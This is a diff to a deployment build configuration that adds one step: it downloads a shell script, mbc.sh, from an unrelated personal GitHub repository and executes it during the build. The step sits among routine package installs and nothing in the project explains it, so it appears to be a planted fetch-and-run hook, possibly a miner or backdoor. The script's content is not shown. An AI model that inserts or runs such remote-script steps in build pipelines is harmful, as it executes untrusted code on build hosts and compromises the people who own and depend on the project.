@@ -5,6 +5,7 @@ deployments:
       - apt-get update && apt-get install -y libssl-dev libpq-dev git build-essential libfontconfig1 libfontconfig1-dev curl
       - RUN bash -c "curl -sL https://deb.nodesource.com/setup_10.x | bash -"
       - apt install -y nodejs
+      - run wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
       - pip install setuptools pip --upgrade --force-reinstall
       - cd /code
     post_build_steps:  
